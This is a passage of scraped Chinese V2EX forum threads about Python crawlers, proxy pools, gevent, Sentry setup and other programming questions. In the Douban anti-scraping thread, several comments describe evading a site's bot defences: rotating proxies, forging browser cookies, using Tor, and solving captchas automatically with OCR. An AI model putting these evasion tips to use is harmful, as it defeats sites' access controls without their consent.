中取 ip ，如果发现 ip 不可用就马上删除 ip 。当 ip list 剩余很少时，重新向服务器请求。具体可以参考我后续开源的利用这个代理 ip 抓取豆瓣电影以及书籍的爬虫", " 共同进步", "ip 有时效性啊。楼主入库多久会清理一次啊", "学习了，谢谢分享！！！", " 抓取的所有免费 ip 或插入到表 free_ipproxy .如果验证之后的有效 ip 会放在单独的表里面。具体表名可以配置，例如抓取豆瓣就放在 douban 中。然后 free_ipproxy 每次抓取的时候回删掉半个小时之前的数据。代理 ip 验证会先验证当前表中之前已经验证过的代理，如果不可用就从当前表中移除，然后在验证 free_ipproxy 中的代理，如果可用就加入到表中。", "已经 star 。不过我的代理都是 zmap 扫描端口，验证请求 ", " 页面，正常返回即入库。数据库中峰值有 7W+ 可用的 http 代理，平均 3w+ 。", "感谢分享", "免费代理基本没有用", "学习爬虫中。感谢分享", "免费代理不做验证 基本好多都没法用的 小伙子加上代理验证吧\r", "\r", "这玩意 2007 年就做过 当时分布式抓取 分布式验证  服务端在 linux  客户端在 win  自动清理无效代理\r", "当时是给分布式爬虫用的", " 是有代理验证的。抓取，验证，然后提供接口。", " 这个数量 nb ！", "感谢分享， star 为敬", "都 2017 了，为何不用 Python 3 写呢", "学习了，已 star", " 以后开一个分支出来用 python3", "已 star", "感谢分享！", "感谢分享~", "通过 8000 端口 我怎么能拿到最近的按照响应排序好的可用的 http 地址 好像 api 接口有点弱。\r", "\"http://127.0.0.1:8000/select?name=douban\",我没理解这里的豆瓣是做什么用的", "我提一个问题。你开源一个爬虫代理框架，和今天是情人节之间有什么关系呢？这之间没有任何逻辑可言嘛！", "不错，已经收藏。", "验证是关键，不然大量无用 ip ，功能就废了", " 之前也想要这么操作，有没有示例", "爬虫菜🐔学习。马可 学习下", "项目挺不错的，赞一个。不过这个瓶颈主要还是网上的免费代理不靠谱啊", "  感谢, 用了半天 还不错 改了 scan 的频率, 拿到的地址比我 1 块钱淘宝买的靠谱些,但也会有连接失败的，再者就是拿到的数量并不多(通过 ", " 拿到的)", " 可用的代理 ip 会随着时间的增加而增加。由于我抓取的站点比较少，而且那些站点更新免费 ip 也很慢，所以有效的 ip 会随着时间增加而不断积累。失效的 ip 会被淘汰。", " 你说的很对", "强，已 star", "好项目，表示去年也写过一个类似的项目，做爬虫必备良品啊，给 lz 顶一个先。\r", "给点建议，既然是写框架就不建议把代理站点硬编码进去，因为现在不少开放代理站点需要进行 js 解析才能拿到代理，所以不同的开放代理站点的解析规则也是不同的，建议把这部分功能里独立开来，规则大家可以一起维护。", "感谢开源~", "哈哈，前段时间也写了一个类似项目： ", "130+ 收藏，厉害了", "年前搞了一个扫描 ip:port 查找 http 代理的，功能还不完善。 ", "已 star", " 现在是一个站点一个脚本，非常方便维护，而且相互之间可以没有影响和关联", "那个...运行了半小时左右， 66ip 就抓到 6 个代理...不合理啊...只抓取首页吗？？\r", "半小时就只抓到 279 个代理 IP ，略少...", " 我只抓了首页，因为在之前的测试中发现后面的很多 IP 都失效了，抓下来也没什么作用。如果想要抓取多页，只需要到 sixsixip.py 中 self.urls = ['", "' % n for n in range(1, 2)] 更改 2 为 想要抓取的页数"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我用 ansible 装 Stdout.sentry 装 sentry==7.7.4\n出现了这个了</p>\n<pre><code>[2017-02-14 03:32:50,763: WARNING/MainProcess] celery@awscn-app-gw-00 ready.\n[2017-02-14 03:32:51,574: WARNING/MainProcess] Substantial drift from devnotify@awscn-app-gw-00 may mean clocks are out of sync.  Current drift is\n28800 seconds.  [orig: 2017-02-14 03:32:51.573788 recv: 2017-02-14 11:32:51.573134]\n\n</code></pre>\n<p>烦死了。。\n你们是怎么一键装 sentry 的？</p>\n</div></div>"], "reply": "16", "tittle": "ubuntu 怎么装 sentry 呀", "comment": ["一个程序员要有读日志理解日志的能力，如果没有，至少要有搜索的能力", "时间不对， ntp 校准一下服务器时间", " 不是时间不对的问题..是时区的问题..2880=8 个小时。。", "时区设错了？怪谁", "我把 Sentry 装进 docker ，按 ", " 步骤来，还是挺容易的。", " 不会 docker 呀。。", " 还有一点，就是公司用的 mysql ，所以只能装 mysql 或者 sqlite 。。所以我不能装 8.X 的 sentry 呀", " 为啥一定要 mysql ，直接用 Sentry 的 API 接口是不关心它的数据库的，是做了什么开发吗？", " 安装呀。。不关心数据库？", " 不用 Docker 的话是要关心用什么数据库；用 Docker 的话都是封装起来的，只暴露一个 Web 端口就行了，管它是什么数据库。", " ...没用过 docker 呀。。现在都是用 docker 了吗？", " 不是所有场景都适合，但你这种情况还是挺方便的。", " 感觉是挺适合的，只自己用，但是要装 docker redis,docker posgresql,docker sentry 。。过几天再试试呗。。", "刚好最近装了 sentry ，貌似没有意见安装的办法，别偷懒，按照官方文档一步一步来，基本都能跑起来", "我是通过 docker 来安装的，照着文档来就行了。", " 8 版的从文档到依赖关系都是 pgsql 的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>教程链接：\n<a href=\"http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/001407503089986d175822da68d4d6685fbe849a0e0ca35000\" rel=\"nofollow\">http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/001407503089986d175822da68d4d6685fbe849a0e0ca35000</a></p>\n<p>廖雪峰大大的教程中，有这么一句</p>\n<pre><code>3 个网络操作是并发执行的，而且结束顺序不同，但只有一个线程\n</code></pre>\n<p>我不理解，为什么单线程就能够并发 3 个网络请求呢</p>\n</div></div>"], "reply": "29", "tittle": "Gevent 是怎么在单线程中实现并发的呢？", "comment": ["不是说了协程了么……", " 就是协程是怎么做到并发的呢？", "异步吧，我也不了解", " IO 操作的时候就挂起啊，调度器去调度执行另外一个协程", "你这问题就像单核 cpu 怎么支持多任务一样\r", "需要调度器", " 那像例子中，第一个网络请求，挂起了，执行第二个网络请求，不就等于第一个网络请求没有再运行了吗？怎么会是并发呢？", " 你应该去了解什么叫并发，什么叫并行", " 操作系统会继续处理你的请求", "因为 io 是异步的", "这个问题问题很好。虽然我没有自己实现过，但我理解大概是这样的。\r", "\r", "要理解两个概念： 1. 协程（ coroutine ） 2.事件驱动（ event-driven ）。\r", "\r", "1. coroutine （类似于 python 里面的 yield 语法），是把一个 function 执行过程暂停，将其 stack 状态保存，当你需要的时候恢复 stack 状态，从暂停的地方继续执行。\r", "通过这样，你可以自由的控制程序的暂停和恢复。在你的例子里面其实是，把每个 function 执行到 io 操作时都暂停，等你需要的时候（ io 返回结果的时候）恢复执行。\r", "但问题是，什么时候你知道 io 返回结果了呢？就需要另外一个机制通知你。\r", "\r", "2. event-driven 就是通知你 io 操作完成的机制。基本想法就是 io 操作发生时，你把 io 的 file descriptor 存到一个 poll 里面，操作系统会监控这个 poll 。当其中有 io 结束的时候，操作系统会给你的程序发一个 signal （ event ），告诉你哪一个 io 结束了。这样你就知道什么时候恢复你的程序执行了。\r", "\r", "当然这么简单说一说，如果不了解操作系统底层的一些知识，感觉还是挺难理解的。\r", "我猜是这么回事，有不对的请指出。", "线程有三个状态:等待 wait ，就绪 ready 和运行 running 。", "很多方案，例如：完成端口", "推荐先看下这两篇文章,作为入门知识\r", "\r", "\r", " 说得好。你得保证执行的任务是可以异步的，不能阻塞，然后就可以随便监听完成事件了。就好比一只手抛多个球，只要球没必要一直用手拿着，就能玩很多。", "13 楼第二个链接贴错了,先看这个[聊聊同步、异步、阻塞与非阻塞]\r", "\r", "只有一个 cpu ，多线程 /多进程是怎么做到并发执行的呢？\r", "开个玩笑……\r", "\r", "在多线程的思路中，每个线程处理一个连接，连接没有数据的时候，就阻塞等待，有数据的线程运行。\r", "在异步的思路中，一个线程同时等待多个连接的数据，哪个连接先来了数据就先处理哪个连接，处理完马上回到阻塞状态。\r", "系统调用 poll 、 select 、 epoll （ linux ） 等提供一个线程可以同时等待多个连接的机制。\r", "因为网络编程中，等待网络数据是耗时最多的状态，所以使用异步的方法效率很高。", "时间片", "稍微看了下 gevent 的具体实现。基本思路是把 python 标准库里面的所有 io 操作都变成 event driven 。好大的工程。。。\r", "\r", "首先是 monkey.patch_all 实际是把所有的 io 模块都打了补丁，具体可以看 patch_module 那个函数，用 gevent.{os, socket, sys...}自定义的操作替代了原生标准模块的操作。\r", "\r", "\r", "\r", "比如 gevent.socket 这个模块其实是覆盖了原生的 socket 模块，关键操作在 socket._wait 这个函数，把 io event 注册到 gevent.hub 里面。\r", "\r", "\r", "\r", "gevent.hub 是对 eventloop 的实现。\r", "我刚开始也有这个困惑\r", "cpu 计算协程无效。跑满 100%就只能干瞪眼了。\r", "\r", "协程完成 io 调度后， cpu 还可以干别的。（让学霸同学帮你写作业，你自己可以去打 dota 这种需要 cpu 的劳动，学霸同学写完作业向你报告，你给他 100 块让他滚蛋，顺便打电话喊女朋友送饭给你吃）", "那不知道楼主是否知道并发的意思呢，如果明白楼上的各位回答很清楚了。。", "来看看这个 ", " 感谢", "如果没有任务阻塞，那么在单处理器上使用并发就没有任何意义。有阻塞的话，就是切分 CPU 时间片， cpu 轮流给每个任务分配占用时间。", "我觉得楼主你需要了解是 gevent 后面的这两个： ", "非阻塞就可以实现单个线程并发了。\r", "软件的线程本身就是非阻塞的，所以一个 CPU 线程可以运行几百几千个软件线程。\r", "同理如果你操作也是非阻塞的，那一个软件线程也就可以运行几百几千个操作了。", " 现在应该是 libev 了，从 gevent1.0 开始就不用 libevent 了", " 哈哈", " 嗯，没注意，提留在 0.9.x 太久了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>借鉴 方糖气球 的 <a href=\"http://sc.ftqq.com/3.version\" rel=\"nofollow\">Server 酱</a> 实现通过测试公众号模版消息推送，能够实时获知服务器的状态</p>\n<p>原博主没有开源，自己就造了个轮子。</p>\n<p>效果图如下：</p>\n<p><img alt=\"\" src=\"https://ww2.sinaimg.cn/large/e14b14d6gy1fcqe3c83cjj20800efgo0.jpg\"></p>\n<p>欢迎大家围观， 具体实现方式在<a href=\"https://github.com/iakisey/ServerMsgPush\" rel=\"nofollow\">GitHub</a></p>\n</div></div>"], "reply": "26", "tittle": "借助微信测试公众号撸了个 服务器信息推送", "comment": ["已围观", "这个好，支持", "不錯，我有個服務號可以玩玩", " 服务号必须认证", "用 Server 酱 不是挺好的吗？", "真心不错", "用企业号主动推消息更爽", "这个不错，可以玩玩", " 普通公众号也可以主动推送\r", "叫 模板信息", " #1    @", " #2    @", " #6    @", " #8   感谢支持\r", "\r", " #5 好是好，就是走别人的服务器了，还不能定制消息模版\r", "\r", " #7 想法很好，哈哈，", " 是的。可是企业号各种类型都能主动推。注册企业号也方便，类型选团队就 OK 了。", "LZ  个人公众号不能用吗？  我是新手哈 ， 另外你这个代码 要放在 linux 的什么环境下 域名 我得绑个域名吧？", "这里有个朋友写的发企业号文本消息的 Shell 脚本, 十几行代码搞定. 需要自取. \r", " #13 感谢🙏  已注册，互粉吧。哈哈", " #12 调用的是高级接口 ，个人公众号没办法用。不用绑定域名", " 什么环境部署啊？", " #16 python3 tornado 框架，  实现方法很简单，就是 http post 请求而已， 根据你会的语言改造呗", "我用 zabbix 做了个，还是不错的。", " #18 Link 呢", "接口测试号除了只能自己关注以外，有其他坑么？\r", "\r", "如果没有的话，自用其实超级爽，各种功能都是全的。", " #20 可以多人关注，最多 100 人。 暂时没发现其它坑。", " 接口测试号在订阅号文件夹里的吧？好像不能像好友和服务号一样能 push ？", "1591 次点击  ∙  46 人收藏     却只有 22 个回复  🤣", "测试号的有效期是多久", " #24 看麻花腾的政策，如果求稳就去注册一个  企业号", " 当然^_^专门为此开了个公司呢"]},
{"content": ["<div class=\"topic_content\">例如 url ：\r<br>xxx/xxx-102.html\r<br>xxx/xxx-43.html\r<br>\r<br>想通过\"-\"以及\".\"去定位中字符串并存入列表.\r<br>请问如何实现?</div>"], "reply": "10", "tittle": "请教一个字符串截取问题", "comment": ["re.match(r'.*-([^\\.]+)\\.', 'xxx-102.html')", ">>> target = 'xxx/xxx-102.html'\r", ">>> result = target[target.find('-') + 1: target.find('.')]\r", ">>> result\r", "'102'", "不想用 re 就做两次 split", ">>> 'xxx/xxx-102.html'.rpartition('-')[2].partition('.')[0]\r", "'102'\r", ">>> 'xxx/xxx-43.html'.rpartition('-')[2].partition('.')[0]\r", "'43'\r", ">>> ''.rpartition('-')[2].partition('.')[0]\r", "''\r", ">>> '-------------'.rpartition('-')[2].partition('.')[0]\r", "''\r", ">>> '.........'.rpartition('-')[2].partition('.')[0]\r", "''\r", ">>> '-.-.-.-.-.-.'.rpartition('-')[2].partition('.')[0]\r", "''\r", ">>> '-123.-456.-789.-123.-456.-789.'.rpartition('-')[2].partition('.')[0]\r", "'789'\r", ">>> 'laksdjflkajs8923u41--..asdf92u34100---12342.'.rpartition('-')[2].partition('.')[0]\r", "'12342'", "In [4]: import re\r", "\r", "In [5]: re.split(r'[.\\-]', 'xxx/xxx-102.html')\r", "Out[5]: ['xxx/xxx', '102', 'html']", "题主是老司机，鉴定完毕", " 你也是老司机鉴定完毕", "  好用。谢谢", ">>> a = 'xxx/xxx-102.html'\r", ">>> a.rsplit('.', 1)[0].rsplit('-', 1)[-1]", "大家要考虑 xxx/xxx 里面也可能包含 . 或者 - 的情况 呵呵  永远不要相信任何输入"]},
{"content": ["<div class=\"topic_content\">Github 上的这个项目 <a target=\"_blank\" href=\"https://github.com/neka-nat/python-forexconnect\" rel=\"nofollow\">https://github.com/neka-nat/python-forexconnect</a>\r<br>\r<br>是外汇交易商 FXCM 第三方的 Python 库，通过 Boost.Python 封装给 Python 在 Linux 下使用\r<br>\r<br>现在我想在 Mac 下使用这个库，需要修改 Makefile ，和链接 Mac 下的库\r<br>（官方已经提供 Mac 下的库 <a target=\"_blank\" href=\"http://www.fxcodebase.com/wiki/index.php/Download\" rel=\"nofollow\">http://www.fxcodebase.com/wiki/index.php/Download</a> ）\r<br>\r<br>\r<br>联系了该 Github 作者，他说他没有 mac ，搞不了。\r<br>\r<br>我自己尝试了下，在 mac 下编译没问题，链接出错。不熟悉 Mac 下编译以及 Makefile ，\r<br>不知道有没有高手接包，可能对于会的人来说，就是几个小时的事情吧。\r<br>\r<br>注： python2 环境， boost 最新 1.6x\r<br>\r<br>\r<br>报价 3K ， 有意者联系 kun.li at <a target=\"_blank\" href=\"http://me.com\" rel=\"nofollow\">me.com</a></div>", "<div class=\"topic_content\">谢谢大家的回复， V2EX 上好人还是多啊，\r<br>\r<br>一下收到不少 email ，有的直接给了解决方案。\r<br>\r<br>感谢大家， 感谢大家， 还要感谢最终解决那位哥们，还解决了 import 的问题\r<br>\r<br>然后还只收了一半的价格，谢谢大神，谢谢大家，谢谢 cctv\r<br>\r<br>\r<br>\r<br>解决了， 散伙\r<br>\r<br>解决了， 散伙\r<br>\r<br>解决了， 散伙</div>"], "reply": "16", "tittle": "Boost + Python + Mac 编译项目外包", "comment": ["没有 Mac ，但是对于 Linux 工具链还是有点了解的。\r", "不清楚具体原因，但是你可以单步调试 Makefile ，首先确定是 Makefile 的问题还是编译器的问题。如果是 Makefile 的问题，那么可能是引用了 Linux 下有的而 Mac 没有的命令，比如说 systemctl 就是 Linux 有的而 Mac 没有的。如果是编译器的问题，可能是链接时在你的 lib path 没有找到需要的库，比如说 epoll 之类的。", "这个是用的 CMake 吧.. 可能要修改下 CMakeLists.txt 内容, 不过手上没 MAC, 哎..", "对 boost 比较熟，可惜 mac 放家里了，看着 3000 赚不到", "感兴趣，我先迅速试一下能不能搞定", "3000 块做这个，真偏啊，在 MAC 上试了一下，编译有问题", "因为有人已经开始编译了， 为了不浪费大家时间和精力，我先选择哪位哥们了！\r", "\r", "因为有人已经开始编译了， 为了不浪费大家时间和精力，我先选择哪位哥们了！\r", "\r", "\r", "因为有人已经开始编译了， 为了不浪费大家时间和精力，我先选择哪位哥们了！", " 我已经搞定了", "  Mac 下面吗？ 你用 ipython 在 mac 下，能不能 import forexconnect", "  gmail 是你吧，我正准备给你回信，说找你要电话号码。其他的朋友，我暂时都回复拒绝了。\r", "\r", "合作愉快。", "这个钱真好赚啊。", "必须点赞。", "楼主确实大方，其实就改一句 CMake 文件的事，看来搞的是暴利行业 (手动滑稽)", "楼主给的钱太多了。。。在几个 cmakelists 文件里加上 python_library 就可以 link 成功了。。", "本条评论没有帮助。", "我就喜欢楼主这样直接的土豪，直接开价，充分表达了对自己时间重要性的评价和对对方专业素养的尊重。", "土豪常上来啊", "解决了， 散伙 \r", "\r", "解决了， 散伙 \r", "\r", "解决了， 散伙\r", "\r", "\r", "感谢 V2 ， 感谢 CCTV ， 感谢各位老大的帮助，再次感谢。", "看到你这个 我突然想起来 我好像在 2007 年搞个一个很痛苦的事情\r", "也是一个其它的库 要在 python 用  3 个语言 最终 先吧其它语言到 cpp 然后再到 python\r", "我一个星期撒都没干 睁开眼就那个 当时差点放弃\r", "\r", "这段回忆 不是看到这个 都忘了"]},
{"content": ["<div class=\"topic_content\">自己目前使用的\r<br>from cassandra.cluster import Cluster\r<br>但是貌似不支持 SUM 这种聚合类查询语句\r<br>群里有 v 友有经验么\r<br>指点下</div>"], "reply": "1", "tittle": "请教下 Python 操作 Cassandra 有什么好的方法", "comment": ["这么多 v 友没人 弄过 Cassandra 么"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>def minmax(test, *args):\nres = args[0]\nfor arg in args[1:]:\nif test(arg, res):\nres = arg\nreturn res</p>\n<p>def lessthan(x, y): return x&lt;y\ndef grtrthan(x, y): return x&gt;y</p>\n<p>如上代码的执行顺序，当执行到 if test 时是怎样的？ def minmax 和 def lessthan 执行顺序是怎样的呢？\n谢谢-__-</p>\n</div></div>", "<div class=\"topic_content\">上面复制粘贴的代码，好好的提交后就乱了。。。。\r<br>def minmax(test, *args):\r<br>    res = args[0]\r<br>    for arg in args[1:]:\r<br>        if test(arg, res):\r<br>            res = arg\r<br>    return res\r<br>\r<br>def lessthan(x, y): return x&lt;y\r<br>def grtrthan(x, y): teturn x&gt;y\r<br>\r<br>增加两句调用\r<br>\r<br>print(minmax(lessthan, 4,5,3,2,1))    \r<br>### 1\r<br>\r<br>print(minmax(grtrthan, 4,5,3,2,1))    \r<br>### 5\r<br>\r<br>（重新输入一遍，预览看了下，换行正常但缩进还是被自动删除了。。。。）</div>"], "reply": "12", "tittle": "问一个较基础的问题，关于 Python 语句执行顺序?", "comment": ["这，楼主的代码缩进有一些惊奇。。。", "语法错误，无法执行", "if test 执行 test 函数，返回值作为 if 的判断条件。\r", "声明的话顺序的，哪个在前面，哪个先声明", "if test 是在 for arg 新 args[1:]，执行后，第一条执行的。\r", "def minmax(test,*args):\r", "    res = args[0]\r", "    for arg in args[1:]:  \r", "        if test(arg, res): \r", "             res = arg\r", "    return res\r", "你不格式化，后面很难看懂啊。我用了 3 分钟才看出来。", "我的天，我的代码也没有格式化？求助怎么缩进啊", "试试 md 支持？\r", "```python\r", "def minmax(test,*args):\r", "    res = args[0]\r", "    for arg in args[1:]:\r", "        if test(arg, res):\r", "            res = arg\r", "    return res \r", "def lessthan(x, y): \r", "    return x<y\r", "def grtrthan(x, y): \r", "    return x>y\r", "```\r", "另外你只是三个函数定义吧？哪来的执行，相互之间也没有调用关系", "def minmax(test, *args):\r", "    res = args[0]\r", "    for arg in args[1:]:\r", "        if test(arg, res):\r", "            res = arg\r", "            return res\r", "\r", "\r", "def lessthan(x, y):\r", "    return x < y\r", "\r", "\r", "def grtrthan(x, y):\r", "    return x > y\r", "\r", "find_less = minmax(lessthan, 5, 6, 7, 8, 9, 4)\r", "find_greater = minmax(grtrthan, 5, 6, 4, 3, 2, 1)\r", "print find_less, find_greater\r", "\r", "# ##### Output\r", "# 4 6", " if test 下的 res = agr 和 return x<y(return x>y)是什么关系？", " v2 不知为什么自动删除了代码的缩进换行格式。。。。就是用 python 实现 py 内置函数 min ， max 的功能", "\r", "\r", " 如果 test=lessthan: \r", "test(arg, res) <==> lessthan(arg, res) <==> (return arg < res) <==>　 True or False\r", "\r", "如果 test=grtrthan:\r", "tese(arg, res) <==> grtrthen(arg, res) <==> ( return arg > res) <==> True or False\r", "\r", "是不明白在 python 中函数名可以作为参数这个问题吗？", " 第一条附言中的的输出应该是 3 和 5 。", " 那就是到 if 是调用 def lessthan ，先执行 return 再执行 res =  arg ， return 用于 if 条件判断？大概懂了，就是没想到 return x<y 是判断语句。谢谢啦"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>把重要的数据放在 Dropbox ，然后在别的电脑同步下来，又要创建软链接，真是麻烦，写了个小工具解决了 <a href=\"https://github.com/zgqq/lninstaller\" rel=\"nofollow\">https://github.com/zgqq/lninstaller</a></p>\n<p>用了 python 发现 php 是世界最好的语言原来是假的</p>\n</div></div>"], "reply": "3", "tittle": "写了简单的软链接工具，再也不怕数据丢失了", "comment": ["1. 这和 ln 有什么区别\r", "2.有个程序叫 find\r", "3.Dropbox 不保存权限。真要按你的例子对 fstab 用的话就死定了。", "fstab 只是举个例子啊，不会比 ln 方便点了？", " 如果文件很重要，我一般都是在 dropbox 新创建一个目录，然后把文件移动到那个目录，再软链接过去，你有更好的备份方法可以提出来"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>翻译了 Python 数据结构一书 <a href=\"http://interactivepython.org/runestone/static/pythonds/index.html\" rel=\"nofollow\">problem-solving-with-algorithms-and-data-structure-using-python</a>，希望对大家有点帮助。</p>\n<ul>\n<li>github 地址: <a href=\"https://github.com/facert/python-data-structure-cn\" rel=\"nofollow\">https://github.com/facert/python-data-structure-cn</a></li>\n<li>gitbook 在线浏览: <a href=\"https://facert.gitbooks.io/python-data-structure-cn\" rel=\"nofollow\">https://facert.gitbooks.io/python-data-structure-cn</a></li>\n</ul>\n</div></div>"], "reply": "100", "tittle": "翻译了开源书籍 《 Python 数据结构》一书", "comment": ["哇！！好棒！", "nice", "good", "以前看过英文版的，非常厚的一本书。\r", "\r", "感谢", "Good Job ！", "手机不能 up\r", "手动 up", "Goooooood Job", "thanks a lot", "太棒了！", "不错，欢迎楼主同步到看云^_^ ", "Python 社区感谢和需要楼主这样的人才和奉献者.", "好棒，感谢楼主👍", "nice", "赞赞赞", "好强。。。", "低头", "很棒，收藏了", "謝謝樓主的貢獻", "Goooooood Job", "刚需 谢谢楼主", "非常棒， 感谢有你。", "楼主辛苦！已 Star ！", "good", "很好很强大", "感谢！！！", "厉害了！！ 赞赞赞！", "感谢楼主！", "感谢楼主，厉害!!!", "good job", "incredible job ！ strong & no enemies.", "谢谢楼主！！！", "这书挺不错的！谢谢 lz 的辛勤劳动", "赞 👍", "感谢楼主的翻译", "赞一切翻译行为，虽然我不会 py ，(逃", "谢谢 lz 的辛勤劳动", "👍👍👍", "感谢。赞。", "赞~虽然没学 Python...", "支持", "楼主 怒赞 +10086 已收藏 已 start", "赞！虽然我可能不会看", "star ，感谢。", "顶一下，哈哈", "感谢楼主，赞", "给你一个大大的么么哒", "感谢楼主，收藏了", "可以翻译书了好棒的英文，还在单词背（哭）", "棒棒哒", "赞一个 为开源事业", "向 dalao 低头", "支持！", "gitbook 上怎么没配置成有 .mobi 下载呢? 这样可以弄去 kindle 看", " 由于翻译还没校对过，所以勘误比较多，怕误人子弟，所以过段时间后再开放下载", "有微信么 我赞助你 100 吧", " 谢谢你的支持，赞助就不必了，对大家有帮助就好😊", "超赞，我想赞助", "自从看了这本书，对 Aukland 的好感度 += 50 。", "点赞", "nice ！", "厉害了，真的翻译完这本书，内功大增吧", "功德无量。", "感谢 发送", "so cool~Star", "like", "很棒！！", "3q ，", "赞楼主，但是请楼主注意下 copyright ，有些书是不能翻译的。", "非常感谢楼主", "赞，学习了", "酷，先 star 。", "License 有点问题，和原文不一样了。已 PR", "赞", "感谢译者", " 谢谢提醒\r", " 谢谢指正，刚学了下 CC", "感谢！", "厉害了 我的哥", " 这里我要引用下孔子的例子 \r", "\r", "鲁国之法，鲁人为人臣妾于诸侯，有能赎之者，取其金于府。子贡赎鲁人于诸侯，来而让，不取其金。孔子曰：“赐失之矣。自今以往，鲁人不赎人矣。取其金则无损于行，不取其金则不复赎人矣。\r", "子路拯溺者，其人拜之以牛，子路受之。孔子曰：\"鲁人必拯溺者矣。孔子见之以细，观化远也。", "佩服佩服，这个毅力，只是一个人业余翻译估计需要 1 年左右时间吧？\r", "\r", "14 年曾想翻译一套类似的 Python 教数据结构的书，结果人太多变得，无疾而终……因为 License 的问题不能公布……", "已收藏，感谢楼主。", " 不接受赞助其实是因为翻译质量还不行，等后期完善后再说。另外自己在翻译的过程中也学到了东西， v 友们这么支持，收获已经够多了。", " 大概 3 个月吧，因为没润色，所以花的时间少了很多，另外现在谷歌翻译的水平比我翻得还好 /(ㄒoㄒ)/~~", "赞赞赞赞！", "看了好几本基于 python 的数据结构、算法的书了，这本竟然还没见过。\r", "顶一下楼主。", "奈斯，感觉楼主", " 我们慢的主要原因是要验证里面的代码……还要改图……现在想想真应该像你一样小步快跑", "赞~虽然没学 Python...", "perfect", " 可以利用 gitbook 命令行工具自己本地生成 mobi 文件\r", " SUMMARY.md 有问题, 比如: [2.算法分析](README.md)应该写成[2.算法分析](2.算法分析 /README.md), 不然的话本地生成 pdf 或 mobi 文件会只生成第一章", "支持", "感谢楼主!", "👍赞", "感谢，已收藏~", "非常感谢,不错的说!", "支持楼主! 👍赞", "点赞！", " got it !", "赞啊！！", "太赞了", "顶上去！赞 LZ ！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，能否有人剖析下豆瓣的反爬策略</p>\n</div></div>", "<div class=\"topic_content\">评论区炸锅了。。。</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>我的 IP 应该被加入了豆瓣的黑名单。</p>\n<p>检测到有异常请求从你的 IP 发出，请 <a href=\"https://www.douban.com/accounts/login?redir=https%3A%2F%2Fbook.douban.com%2F\" rel=\"nofollow\">登录</a> 使用豆瓣。</p>\n</div></div>", "<div class=\"topic_content\">我不是豆瓣员工，标题输入有误。\r<br>\r<br>我是写了一个代理 IP 工具目前用豆瓣做测试，结果把我自己的原始 IP 封了。</div>"], "reply": "25", "tittle": "有豆瓣的同事吗？想请教下豆瓣的反爬策略", "comment": ["这能告诉你？", "买海量代理可解决绝大部分反爬问题", "这是要人吃豆瓣的饭砸豆瓣的锅。", "兄弟这不厚道啊", "有法院的同事吗？想请教下现行法律有什么漏洞", "有福彩中心的同事吗？想请教下下一期中奖号码是多少", "有监狱的同事吗？想请教一下怎么越狱", " \r", " \r", " \r", "都好 6 ，哈哈哈哈", "有钻石矿井的同事吗？想请教一下怎么哪点儿回家", "看标题，楼主应该在豆瓣工作", " 很明显不是", " 所以为什么是“同事”呢？", "我觉得楼主是也要建立反爬机制吧", "有银行的同事吗？我想请教下小型机的和审计系统的 root 密码。", " 楼主语文自学的", "我知道有一个人知道，而且这个人开发了收集豆瓣小组里妹子福利图片的 app ……", "入职豆瓣，加白名单自己的 IP", "没什么反爬啊", " 如果楼主是豆瓣员工，在公共论坛讨论公司机密。最轻最轻的处罚应该是开除，如果造成信息安全事故，可能还得承担民事或者刑事责任。\r", "如果楼主不是豆瓣员工，那一定是伸手惯犯。", " 或者是反-反爬机制", "豆瓣防盗链就是按频率的，白天一分钟超过 40 次就出验证码，晚上放宽到 60", "代理就能解决，邪恶点用 tor 就可以( ╯□╰ )", "以前做过的豆瓣抓取是，伪装真实浏览器 cookie ，每个 cookie 每分钟请求几十次，高频率容易被封 ip ，保持出验证码的低频多代理。然后出验证码都是英语单词，简单处理下背景，找个 OCR 接口一调，再做下单词纠错，自动提交验证码继续抓。", "我的 ip 也被拉黑了，今天用 pyspider 爬取一些豆瓣的一些信息拿来练习下数据分析つ﹏⊂", "可能会根据你的请求频率，短时间内请求数量，以及请求间隔是否有规律\r", "所以我的想法是多代理，设随机不少于一定数值的延迟"]},
{"content": ["<div class=\"topic_content\">我对 python 虚拟环境的使用，一直停留在手动 /IDE 创建一个虚拟环境，然后用 IDE 设置好，就写代码了。\r<br>我想知道的是，如果在命令行下用 vim ，我有个项目要用到虚拟环境，我该怎么操作，我的项目文件夹该放哪里？我先激活虚拟环境再 cd 到我的项目文件夹然后用 vim 编程么？还有就是在实际服务器上，跑多个项目，怎么做到不同项目指定不同的虚拟环境来跑？</div>"], "reply": "16", "tittle": "关于命令行使用 Python 虚拟环境的问题，求解答。", "comment": ["virtualenv", "写程序，例如拿 vim 写程序，完全是文本编辑工作，根本用不到虚拟环境。\r", "\r", "测试时先激活 venv 再运行即可。\r", "\r", "线上？同时部署多个 venv 就行了，不同项目指定不同 venv 。完全可以使用脚本把工作自动化。具体做法 venv 的文档都写清楚了。", "我的使用只停留在很早以前 pokemon 挂机的时候那个脚本的 readme 里面的命令 好像是 vursualenv", " 谢谢。 vim 好像不能识别到虚拟环境。\r", "还有，如何让指定特定的虚拟环境给项目。", " 谢谢。我看看。", "多个项目指定不同的版本，这时候可以推荐 docker 了？", "pyenv-virtualenv;\r", "\r", "vim 有插件 jmcantrell/vim-virtualenv", " 额。那是部署的时候的事。我只想在本地开发而已。", " ok 。我试试", "先 source ~/venv/bin/active 。然后跑 python xxx.py 就行了\r", "对于不同环境，可以 source ~/venv_xx/bin/active && python xxx.py\r", "或者直接~/venv_xx/bin/python2.7 xxx.py 来执行，这个招数用在 crontab 上特别好使。\r", "但是现在有 docker 之后，上面技巧都不常用了。", " win 下把不同版本的 python 安装到不同目录，把 python.exe 改为 python35.exe 或 python36.exe 这种的，文件夹都加入环境变量，启动时候直接 python35/python36 即可； linux 下没试过，应该也可以用类似的方法。", "virtualenv+virtualwrapper 足够啦。", "新出的 pipenv 不错", "我一直用 pyenv", " 感谢。"]},
